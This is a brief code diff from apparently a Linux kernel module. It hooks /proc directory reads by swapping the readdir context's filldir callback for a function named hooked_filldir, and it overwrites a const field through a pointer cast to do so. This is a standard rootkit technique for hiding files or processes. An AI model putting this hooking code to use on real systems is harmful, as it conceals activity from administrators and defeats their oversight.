@@ -154,12 +154,9 @@ int proc_readdir_entry(unsigned long ret_addr, hk_regs *regs) {
         return 0;
     }
 
-    struct dir_context new_original_dc = {
-        .actor = hooked_filldir,
-        .pos = original_ctx->pos
-    };
-
-    memcpy(&hooked_ctx->original, &new_original_dc, sizeof(new_original_dc));
+    // Initialize by copying, then overwrite the const actor via a pointer cast
+    memcpy(&hooked_ctx->original, original_ctx, sizeof(struct dir_context));
+    *(filldir_t *)(&hooked_ctx->original.actor) = hooked_filldir;
     hooked_ctx->original_ctx = original_ctx;
 
     p_inline_regs_set_arg2(regs, (unsigned long)&hooked_ctx->original);
